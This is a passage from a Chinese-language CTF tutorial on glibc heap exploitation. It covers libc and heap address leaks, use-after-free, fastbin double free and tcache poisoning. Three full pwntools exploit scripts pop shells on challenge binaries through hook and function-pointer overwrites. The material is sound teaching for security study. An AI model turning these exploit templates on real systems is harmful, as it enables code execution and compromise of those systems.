<p>通常情况下，我们利用 unsorted bin 中的 chunk 泄露 libc 地址，其与 main_arena 间距离为 0x58&#x2F;0x60(libc2.26 and up， with tcache)，而 main_arena 与 __malloc_hook 间地址相差0x10，故有如下板子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span> <span class="comment"># tcache</span></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span> <span class="comment"># no tcache</span></span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - offset <span class="comment"># other condition(not unsorted bin leak)</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这种利用的方式可以是通过垂悬指针打印bins中chunk内容，也可以是通过送入 bins 后再分配回来后打印 chunk 上残留的脏数据获得</p>
<h3 id="IO-FILE-libc-基址"><a href="#IO-FILE-libc-基址" class="headerlink" title="_IO_FILE - libc 基址"></a>_IO_FILE - libc 基址</h3><p>主要针对没有打印函数或者打印次数不够（比如说只能输出一次但是得先泄露堆基址的libc2.32一类的）的情况，我们可以通过劫持<code>_IO_2_1_stdout_ </code>结构体以泄漏出 libc 的地址，由于 main_arena 与 <code>_IO_2_1_stdout_</code> 在相靠近的几个页内，故我们可以通过 partial overwrite 的方式以 1&#x2F;16 的概率去撞 _IO_2_1_stdout_，之后修改该结构体以使得诸如 <code>puts</code> 这样的函数<strong>误认为有未输出内容</strong>从而打印出 libc 相关地址，可以通过 gdb 进行调试获得泄露出的地址相对于 libc 基址的偏移</p>
<p>本内容放到后面的 <code>IO_FILE exploit</code> 章节再行详细阐述</p>
<h3 id="tcache-key-堆基址（only-libc2-29-and-up）"><a href="#tcache-key-堆基址（only-libc2-29-and-up）" class="headerlink" title="tcache key - 堆基址（only libc2.29 and up）"></a>tcache key - 堆基址（only libc2.29 and up）</h3><p>tcache key 所用的值便是 tcache 结构体本身的地址，故若我们能够打印 tcache key ，就能直接获得堆基址</p>
<p>对于常规的其他堆地址，我们还有如下板子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = heap_leak - <span class="number">0x290</span> - <span class="number">0x10</span> - offset <span class="comment"># C</span></span><br><span class="line">heap_base = heap_leak - <span class="number">0x11c10</span> - <span class="number">0x290</span> - <span class="number">0x10</span> - offset <span class="comment"># C++ with string cin cout</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是不同版本的libc下这个偏移（0x290，libc2.30 and up；0x250，below the libc 2.30）并不一定是相同的</p>
<h3 id="safe-linking-in-tcache-堆基址（only-libc2-32-and-up）"><a href="#safe-linking-in-tcache-堆基址（only-libc2-32-and-up）" class="headerlink" title="safe-linking in tcache - 堆基址（only libc2.32 and up）"></a>safe-linking in tcache - 堆基址（only libc2.32 and up）</h3><p>在 tcache 的一个 entry 中放入第一个 chunk 时，其同样会对该 entry 中的 “chunk” （NULL）进行异或运算后写入到将放入 tcache 中的 chunk 的 <code>fd</code> 字段，若是我们能够打印该 free chunk 的fd字段，<strong>便能够直接获得未经异或运算的堆上相关地址</strong></p>
<h2 id="二、use-after-free"><a href="#二、use-after-free" class="headerlink" title="二、use after free"></a>二、use after free</h2><p>use after free 即对于垂悬指针的利用，在这类题目中往往题目在逻辑设计上会在free一个堆块后留下一个垂悬指针，未将其置 NULL ，使得该堆块虽然被 free 了，但是我们仍然能够使用该堆块</p>
<p>常见的垂悬指针利用有：</p>
<ul>
<li>泄露数据</li>
<li>double free</li>
<li>构造任意地址写</li>
</ul>
<h4 id="例题：ciscn-2019-n-3-Use-After-Free"><a href="#例题：ciscn-2019-n-3-Use-After-Free" class="headerlink" title="例题：ciscn_2019_n_3 - Use After Free"></a>例题：ciscn_2019_n_3 - Use After Free</h4><p>惯例的<code>checksec</code>，发现只开了NX和canary</p>
<p><img src="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png" alt="image.png"></p>
<p>拖入IDA进行分析，大概是一道有着分配、释放、打印堆块功能的程序</p>
<p><img src="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png" alt="image.png"></p>
<p>释放堆块时用的是堆块上的函数指针</p>
<p><img src="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png" alt="image.png"></p>
<p>在释放堆块后不会将堆块指针置NULL，<strong>存在UAF漏洞</strong></p>
<p><img src="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png" alt="image.png"></p>
<p>由于程序中存在system函数，故考虑通过UAF覆写堆块指针为system后执行<code>system(&quot;sh&quot;)</code>以get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27248)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command: <span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;CNote&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, value: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, length: <span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value &gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xc</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(e.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># idx2, overlapping with idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png" alt="image.png"></p>
<h3 id="①double-free"><a href="#①double-free" class="headerlink" title="①double free"></a>①double free</h3><p>double free 则是 use after free 中最为热门的一种利用方式，当同一个 chunk 在堆管理器中同时存在两份副本时，我们将其中一个堆块分配回来并改写其 fd 指针，当该 chunk 再一次被取出时，留在堆管理器中的 chunk 地址便是由我们写入的 fake chunk 地址，此时我们再行分配便可以在我们所希望的地址获得一个 chunk，<strong>实现任意地址写</strong></p>
<h4 id="I-fastbin-double-free"><a href="#I-fastbin-double-free" class="headerlink" title="I.fastbin double free"></a>I.fastbin double free</h4><p>由于 fastbin 对于 double free 的检查较为稀松，故通常考虑通过 fastbin double free 进行任意地址写</p>
<p>fastbin 仅会检查链表的第一个节点，故仅需要构造 <code>A-&gt;B-&gt;A</code> 的 free() 链即可完成 fastbin double free，通过这样的方式我们可以利用 fastbin 进行<strong>有限地址写</strong>，这种利用方式也叫做 <strong>fastbin dup</strong></p>
<h5 id="size检查"><a href="#size检查" class="headerlink" title="size检查"></a>size检查</h5><p>在malloc取出fastbin中的chunk时会检查其size字段，<strong>若与其对应下标不相符则会引发程序abort，限制了我们所能构造fake chunk的位置</strong>，但该size检查<strong>不会检查标志位</strong></p>
<h5 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="__malloc_hook - 0x23"></a>__malloc_hook - 0x23</h5><p>fastbin attack中分配到__malloc_hook附近的fake chunk通常都是malloc(0x60)，也就是size &#x3D;&#x3D; 0x71，这是因为在__malloc_hook - 0x23这个地址上fake chunk的SIZE的位置刚好是<code>0x7f</code>，满足了绕过fastbin的size检查的要求</p>
<p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p>
<p>这是一个十分优雅的位置，因为无论何时这个位置上的值都是 0x7f，同时离 __malloc_hook 仅有 0x23 字节的距离，我们在构造 size 为 0x71 的 fake fastbin chunk 时若是构造到这个位置则完全不需要担心 size 检查的问题，因此 __malloc_hook - 0x23 也就成为了构造 fake fastbin chunk 的“热门地带”</p>
<p>需要注意的是在libc2.31版本中这个位置上的数据已经不再是0x7f，故我们需要<code>具体问题具体分析,具体版本具体调试</code></p>
<p><img src="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png" alt="image.png"></p>
<h5 id="例题：bytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget"><a href="#例题：bytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget" class="headerlink" title="例题：bytectf2019 - mulnote - use after free + fastbin attack + one_gadget"></a>例题：bytectf2019 - mulnote - use after free + fastbin attack + one_gadget</h5><p><a href="/download/bytectf2019/mulnote.zip" title="点击此处下载原题">点击下载-mulnote.zip</a></p>
<p>一道有着分配、编辑、打印、释放堆块功能的题目</p>
<p>漏洞点主要在于释放函数的策略，对于每一次堆块的释放，其都会起一个新的线程执行释放堆块操作</p>
<p><img src="https://i.loli.net/2021/02/24/oXgdMnHJvs6cxUO.png" alt="image.png"></p>
<p>每一个线程都会调用<code>start_routine</code>函数完成最终的操作，漏洞点就在于<code>free()</code>之后线程会先休眠几秒后再将堆块指针置零，若是我们在这段时间内进行其他操作，便可以double free + 地址泄露一套带走</p>
<p><img src="https://i.loli.net/2021/02/24/2V4ELnQedAwPaSZ.png" alt="image.png"></p>
<p>libc2.23，没有tcache，考虑fastbin double free劫持__malloc_hook为one_gadget以get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./mulnote&#x27;</span>, env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mulnote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;note&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;new note&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;R&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">b&#x27;S&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin double free</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2, overlapping chunk with idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x13</span> + p64(libc_base + one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/24/cW9bfsqA5ky7a2h.png" alt="image.png"></p>
<h4 id="II-tcache-double-free"><a href="#II-tcache-double-free" class="headerlink" title="II.tcache double free"></a>II.tcache double free</h4><p>前面讲到，由于检查十分稀松的缘故，自 libc2.2 6起引进的 tcache 机制便成为了 ptmalloc 利用的大热门，libc2.29前对于 double free 几乎视而不见的机制也让 pwn 手们不用绞尽脑汁构造以前形如<code>A-&gt;B-&gt;A</code>的复杂利用链</p>
<p>通过诸如 tcache double free 等方式，我们可以达到修改 tcache_entry 的 next 指针的目的，从而在任意地址分配到一个 chunk，这种手法也叫做<strong>tcache poisoning</strong></p>
<blockquote>
<p>到底是谁起这么多奇奇怪怪的名字（恼）</p>
</blockquote>
<h5 id="例题：ciscn-2019-es-1-Use-After-Free-tcache-poisoning"><a href="#例题：ciscn-2019-es-1-Use-After-Free-tcache-poisoning" class="headerlink" title="例题：ciscn_2019_es_1 - Use After Free + tcache poisoning"></a>例题：ciscn_2019_es_1 - Use After Free + tcache poisoning</h5><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/07/ZaHXOWpYDhPAFJ7.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是有着分配、打印、释放堆块的功能</p>
<p>漏洞点在于释放时指针未置0，存在 UAF（<del>暗示996的公司永远不可能被真正消灭</del>（←🔫</p>
<p><img src="https://i.loli.net/2021/04/07/vk6zEGilmgOD9aw.png" alt="image.png"></p>
<p>libc 2.27，没有 double free检测，套板子一套带走（感觉现在大部分题目都是套板子a…）</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27368</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the size of compary&#x27;s name&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input compary call:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\x07&#x27;</span> * <span class="number">0xf</span>) <span class="comment"># idx 5, hijack the tcache</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/Lm26WXhGQRPFAdC.png" alt="image.png"></p>
<h4 id="III-tcache-key-bypass（libc-2-29-and-up）"><a href="#III-tcache-key-bypass（libc-2-29-and-up）" class="headerlink" title="III.tcache key bypass（libc 2.29 and up）"></a>III.tcache key bypass（libc 2.29 and up）</h4><p>前面讲到，自 glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk 字段，值为 tcache 结构体的地址，若 free() 检测到 chunk-&gt;bk &#x3D;&#x3D; tcache 则会遍历 tcache 对应链表中是否有该chunk</p>
